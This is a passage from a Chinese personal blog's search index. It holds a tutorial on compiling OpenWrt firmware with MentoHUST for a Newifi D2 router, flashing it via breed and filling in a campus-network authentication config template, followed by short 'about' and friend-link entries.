https://github.com/KyleRicardo/MentoHUST-OpenWrt-ipk.git package/mentohust 修改默认ip 修改lede目录下的package/base-files/files/bin/config_generate文件 将ipad=${ipaddr:-\"192.168.1.1\"}修改为ipad=${ipaddr:-\"192.168.1.10\"} 开始编译 make menuconfig make -j8 download V=s 下载dl库,网络原因可能需要多次执行,建议使用全局代理 make -j1 V=s (-j1后面是线程数,第一次编译推荐用单线程)或者直接使用make -j$(($(nproc) + 1)) V=s 写入固件 已经刷入breed,写入教程 在lede/bin/targets/ramips/mt7621下可以找到一个叫openwrt-ramips-mt7621-d-team_newifi-d2-squashfs-sysupgrade.bin的固件 将路由器断电,网线连接路由器的wan口和电脑的网线接口(可以用usb转接) 按住usb键或者reset不放,开机,等待电源灯闪烁,此时进入breed,浏览器输入http://192.168.1.1,先对编程器固件和eeprom进行备份 然后选择固件更新将固件openwrt-ramips-mt7621-d-team_newifi-d2-squashfs-sysupgrade.bin上传即可 待写入完成后可以在wifi中看到名为OpenWrt的开放wifi,后台管理界面为192.168.1.10 用户名为root,密码为password 设置mentohust 参考连接1 参考连接2 配置文件模版 # MentoHUST for Linux By HustMoon Studio # # 配置文件名称必须是小写/etc/mentohust.conf，编码格式建议是UTF-8 # 配置文件中一行开头的空格和Tab会被忽略，其他的会视为参数一部分 # 配置文件中Section与Key不区分大小写，以#或;开头的行视为注释 # 同一个参数若在命令行参数和配置文件中均有设置，使用命令行参数 # 命令行中使用参数-h或-?可查看详细参数信息，建议通过命令行设置参数 # 命令行中使用参数-w可将配置更新到/etc/mentohust.conf [MentoHUST] MaxFail=0 ;用户名，长度不超过64 Username=******;学号 ;密码(简单加密) EncodePass=********;不能直接填写上网密码 ;网卡 Nic=eth0.2 ;静态IP用户可以使用非本机IP IP=172.23.228.200 ;掩码，无关紧要 Mask=255.255.255.0 ;网关，如果指定了就会监视网关ARP信息 Gateway=0.0.0.0 ;DNS服务器，无关紧要 DNS=0.0.0.0 ;Ping主机，用于掉线检测，0.0.0.0表示关闭该功能 PingHost=0.0.0.0 ;每次发包超时时间（秒） Timeout=8 ;发送Echo包的间隔（秒） EchoInterval=30 ;失败等待（秒）认证失败后等待RestartWait秒或者服务器请求后重启认证 RestartWait=15 ;寻找服务器时的组播地址类型 0标准 1锐捷 2将MentoHUST用于赛尔认证 StartMode=0 ;DHCP方式 0(不使用) 1(二次认证) 2(认证后) 3(认证前) DhcpMode=2 ;是否后台运行: 0(否) 1(是，关闭输出) 2(是，保留输出) 3(是，输出到文件/tmp/mentohust.log) DaemonMode=3 ;是否显示通知： 0(否) 1~20(是) ShowNotify=0 ;客户端版本号，如果未开启客户端校验但对版本号有要求，可以在此指定，形如3.30 Version=5.00 ;认证数据文件，如果需要校验客户端，就需要正确设置 DataFile=/etc/mentohust/ ;进行DHCP的脚本 DhcpScript=udhcpc -i eth0.2 在设置完成后,将mentohust设置为开机自启动 ","date":"2020-09-11","objectID":"/jnu-mentohust/:0:0","tags":null,"title":"JNU-mentohust","uri":"/jnu-mentohust/"},{"categories":null,"content":"没啥*用的自我介绍 一条来自不用军训(现在要军训了)大学的咸鱼,梦想是混吃等死(: 巨硬信仰粉(要不是VS太卡,鬼才用JetBrains(逃 顶级白嫖选手 干啥啥不行,白给第一名(A1高闪来一个好吗?秋梨膏! 如果有写错的地方,请务必点醒我这只小菜鸡`(\u003e﹏\u003c)′ ","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"\r存在感消失的地方|ω•`)\r身处寒夜 把握星光✨\rPassbyAの阿瓦隆\r我只是路过的一介路人罢了\rK1rit0's Blog\r恒HengY1毅\r","date":"0001-01-01","objectID":"/links/:0:0","tags":null,"title":"友链","uri":"/links/"}]